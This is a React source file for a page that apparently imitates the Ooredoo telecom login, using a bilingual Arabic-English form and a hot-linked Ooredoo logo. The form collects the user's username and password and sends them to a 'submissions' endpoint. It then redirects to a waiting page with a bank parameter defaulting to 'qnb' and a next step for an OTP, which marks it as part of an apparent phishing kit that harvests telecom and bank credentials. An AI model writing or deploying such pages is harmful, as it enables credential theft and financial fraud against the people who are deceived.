import { useState, useEffect } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { toast } from "sonner";
import { X } from "lucide-react";

export default function Ooredoo() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);
  const { language, setLanguage } = useLanguage();
  const sessionId = params.get("session") || localStorage.getItem("sessionId") || "";
  const hasError = params.get("error") === "true";

  const isArabic = language === "ar";

  const [ooredooUser, setOoredooUser] = useState("");
  const [ooredooPassword, setOoredooPassword] = useState("");
  const [errorMessage, setErrorMessage] = useState<string | null>(null);

  useEffect(() => {
    if (hasError) {
      const msg = sessionStorage.getItem("error_message");
      if (msg) {
        setErrorMessage(msg);
        sessionStorage.removeItem("error_message");
      }
    }
  }, [hasError]);

  const submitOoredooMutation = trpc.submissions.submitOoredoo.useMutation();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const bank = params.get("bank") || "qnb";
    
    try {
      await submitOoredooMutation.mutateAsync({
        sessionId: sessionId,
        ooredooUser,
        ooredooPassword,
      });
      setLocation(`/waiting?bank=${bank}&session=${sessionId}&next=otp-ooredoo`);
    } catch (error) {
      toast.error(isArabic ? "حدث خطأ أثناء الإرسال" : "Error during submission");
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col font-sans" dir={isArabic ? "rtl" : "ltr"}>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');
        .page-wrapper { font-family: 'Cairo', sans-serif; }
      `}</style>
      
      <div className="page-wrapper w-full max-w-lg mx-auto">
        <header className="p-4 flex items-center justify-between border-b-2 border-[#d71920]">
          <div className="text-[#d71920] font-bold">☰</div>
          <div className="flex-grow flex justify-center">
            <img src="https://i.ibb.co/LzNfX8fL/ooredoo-logo.png" className="h-10" alt="Ooredoo Logo" />
          </div>
          <div className="text-[10px] font-bold text-[#d71920] border border-[#d71920] px-2 py-1 rounded-full cursor-pointer" onClick={() => setLanguage(language === "ar" ? "en" : "ar")}>
            {language === "ar" ? "English" : "العربية"}
          </div>
        </header>

        <div className="p-6">
          {errorMessage && (
            <div className="mb-6 bg-rose-50 border border-rose-200 rounded-2xl p-4 flex items-start gap-3 animate-in fade-in slide-in-from-top-4 text-right">
              <div className="bg-rose-500 text-white rounded-full p-1 shrink-0">
                <X className="w-4 h-4" />
              </div>
              <p className="text-rose-600 text-sm font-bold leading-relaxed">
                {errorMessage}
              </p>
            </div>
          )}

          <h1 className="text-2xl font-bold text-slate-800 mb-2">{isArabic ? "تسجيل الدخول" : "Login"}</h1>
          <p className="text-slate-500 text-sm mb-8">{isArabic ? "تسجيل الدخول باستخدام اسم المستخدم وكلمة المرور." : "Login using your username and password."}</p>
          
          <form onSubmit={handleSubmit} className="space-y-6">
            <input
              type="text"
              placeholder={isArabic ? "البريد الإلكتروني أو اسم المستخدم" : "Email or Username"}
              className="w-full h-14 px-4 border border-slate-200 rounded-lg outline-none focus:border-[#d71920] transition-all"
              value={ooredooUser}
              onChange={(e) => setOoredooUser(e.target.value)}
              required
            />
            <input
              type="password"
              placeholder={isArabic ? "كلمة المرور" : "Password"}
              className="w-full h-14 px-4 border border-slate-200 rounded-lg outline-none focus:border-[#d71920] transition-all"
              value={ooredooPassword}
              onChange={(e) => setOoredooPassword(e.target.value)}
              required
            />
            <span className="text-[#d71920] text-sm underline cursor-pointer block">{isArabic ? "هل نسيت كلمة المرور؟" : "Forgot Password?"}</span>
            <button type="submit" className="w-full h-14 bg-[#d71920] text-white font-bold rounded-full text-lg shadow-lg active:scale-95 transition-all">
              {isArabic ? "تسجيل الدخول" : "Login"}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}
